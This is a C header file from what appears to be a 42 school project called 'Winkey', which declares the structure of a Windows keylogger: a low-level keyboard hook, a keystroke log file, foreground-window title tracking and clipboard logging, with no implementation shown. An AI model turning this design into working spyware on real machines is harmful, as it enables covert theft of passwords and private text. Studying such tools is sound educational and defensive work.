/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   winkey.h                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: vzurera- <vzurera-@student.42malaga.com    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/05/14 16:21:25 by vzurera-          #+#    #+#             */
/*   Updated: 2025/08/19 17:06:55 by vzurera-         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#pragma once

#pragma region "Includes"

	#include <windows.h>
    #include <string.h>
	#include <stdio.h>
	#include <errno.h>
	#include <time.h>
	#include <ShlObj.h>

#pragma endregion

#pragma region "Variables"

	#define NAME		"Winkey"
	#define VERSION		"1.0.0"

	// Structure for the global keylogger state
    typedef struct s_winkey_state 
	{
        FILE   *logFile;          // opened log file
        HHOOK   keyboardHook;     // installed hook handle
        HWND    lastWindow;       // last foreground window
        char    lastTitle[256];   // last logged window title
    }   t_WinkeyState;

	typedef struct s_clipboard_state 
	{
		FILE   *clipboardFile;          // clipboard log file
		char   lastClipboardText[1024 * 10];  // last clipboard text
	}   t_ClipboardState;

	extern t_WinkeyState g_winkeyState;
	extern t_ClipboardState g_clipboardState;


#pragma endregion

#pragma region "Methods"


	// main.c
    BOOL IsAdmin(void);

    // service.c - Service management and activation/deactivation
    BOOL ActivateHook(void);
    void DeactivateHook(void);

    // hook.c - Hook callback used by service.c
    LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

    // log.c - Main log file management
    BOOL OpenLogFile(void);

    // key.c - Key codes to human-readable text conversion
    const char *VkCodeToString(DWORD vkCode);
    
    // clipboard.c - Clipboard log management
    BOOL OpenClipboardLog(void);
    void CloseClipboardLog(void);
    void LogClipboardIfChanged(void);

    // keyboardstate.c
    void BuildKeyboardState(BYTE ks[256]);

#pragma endregion
